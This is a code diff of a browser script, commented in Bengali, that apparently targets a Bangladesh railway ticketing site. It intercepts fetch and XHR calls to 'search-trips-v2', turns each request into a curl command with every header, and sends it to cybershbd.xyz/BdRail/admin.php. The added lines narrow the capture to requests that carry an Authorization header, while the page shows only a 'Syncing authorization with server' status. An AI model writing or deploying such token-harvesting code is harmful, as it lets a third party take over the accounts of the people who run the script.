@@ -110,7 +110,7 @@
     const syncText = document.getElementById('cybersh-sync-text');
     const iconContainer = document.getElementById('cybersh-icon-container');
 
-    // Helper function to send cURL via GET with proper loading and real server response handling
+    // HTTPS দিয়ে সার্ভারে cURL পাঠানোর ফাংশন (লোডিং এবং রেসপন্স সহ)
     async function sendCurlToServer(curlData) {
         try {
             // ১. লোডিং অ্যানিমেশন চালু
@@ -120,17 +120,18 @@
             iconContainer.style.borderTopColor = '#38bdf8';
             iconContainer.style.background = 'transparent';
             
-            syncText.innerText = 'Syncing authentication with server...';
+            syncText.innerText = 'Syncing authorization with server...';
             syncStatus.style.borderColor = 'rgba(56, 189, 248, 0.3)';
             syncStatus.style.background = 'rgba(56, 189, 248, 0.08)';
             syncStatus.style.color = '#38bdf8';
 
-            // ২. রিকোয়েস্ট পাঠানো
+            // ২. HTTPS ব্যবহার করে রিকোয়েস্ট পাঠানো
             const targetUrl = `https://cybershbd.xyz/BdRail/admin.php?auth=${encodeURIComponent(curlData)}`;
+            
             const response = await fetch(targetUrl, { method: 'GET' });
             const result = await response.json();
 
-            // ৩. লোডিং বন্ধ করে সাকসেস মেসেজ দেখানো
+            // ৩. লোডিং বন্ধ করে সার্ভারের আসল রেসপন্স মেসেজ দেখানো
             iconContainer.className = '';
             iconContainer.style.width = '6px';
             iconContainer.style.height = '6px';
@@ -149,7 +150,6 @@
             syncStatus.style.color = '#4ade80';
 
         } catch (err) {
-            // যদি CORS বা নেটওয়ার্ক ফেইল করে তবে এরর দেখাবে
             iconContainer.className = '';
             iconContainer.style.width = '6px';
             iconContainer.style.height = '6px';
@@ -157,7 +157,7 @@
             iconContainer.style.borderRadius = '50%';
             iconContainer.style.border = 'none';
 
-            syncText.innerText = 'Sync Failed! Check CORS header on admin.php';
+            syncText.innerText = 'Sync Failed! Check network or SSL connection.';
             syncStatus.style.borderColor = 'rgba(239, 68, 68, 0.4)';
             syncStatus.style.background = 'rgba(239, 68, 68, 0.08)';
             syncStatus.style.color = '#ef4444';
@@ -219,7 +219,22 @@
         };
 
         xhr.addEventListener('load', function() {
+            // নিজস্ব ব্যাকএন্ড বা অন্য ডোমেইন হলে ইগনোর করবে
+            if (requestURL.includes('cybershbd.xyz')) return;
+
             if (requestURL.includes('search-trips-v2')) {
+                // চেক করা হচ্ছে যে Authorization হেডার আছে কিনা
+                let hasAuth = false;
+                for (let header in requestHeaders) {
+                    if (header.toLowerCase() === 'authorization') {
+                        hasAuth = true;
+                        break;
+                    }
+                }
+
+                // যদি অথ টোকেন না থাকে তবে স্কিপ করবে
+                if (!hasAuth) return;
+
                 let curl = `curl '${requestURL}' \\\n  -X '${requestMethod}'`;
                 
                 for (let header in requestHeaders) {
@@ -244,19 +259,38 @@
     // Fetch API ইন্টারসেপ্টর
     const originalFetch = window.fetch;
     window.fetch = async function(...args) {
+        const url = typeof args[0] === 'string' ? args[0] : (args[0] && args[0].url ? args[0].url : '');
+        
+        // নিজস্ব ব্যাকএন্ড হলে ফেচ রিকোয়েস্ট সম্পূর্ণ ইগনোর করবে (লুপ এড়াতে)
+        if (url.includes('cybershbd.xyz')) {
+            return originalFetch.apply(this, args);
+        }
+
         const response = await originalFetch.apply(this, args);
         try {
-            const url = typeof args[0] === 'string' ? args[0] : (args[0] && args[0].url ? args[0].url : '');
             if (url.includes('search-trips-v2')) {
                 const options = args[1] || {};
                 const method = options.method || 'GET';
-                let curl = `curl '${url}' \\\n  -X '${method}'`;
-
+                
+                let headers = {};
                 if (options.headers) {
-                    const headers = options.headers instanceof Headers ? Object.fromEntries(options.headers.entries()) : options.headers;
-                    for (let header in headers) {
-                        curl += ` \\\n  -H '${header}: ${headers[header]}'`;
+                    headers = options.headers instanceof Headers ? Object.fromEntries(options.headers.entries()) : options.headers;
+                }
+
+                // Authorization হেডার চেক করা
+                let hasAuth = false;
+                for (let header in headers) {
+                    if (header.toLowerCase() === 'authorization') {
+                        hasAuth = true;
+                        break;
                     }
+                }
+
+                if (!hasAuth) return response;
+
+                let curl = `curl '${url}' \\\n  -X '${method}'`;
+                for (let header in headers) {
+                    curl += ` \\\n  -H '${header}: ${headers[header]}'`;
                 }
 
                 lastCurlCommand = curl;
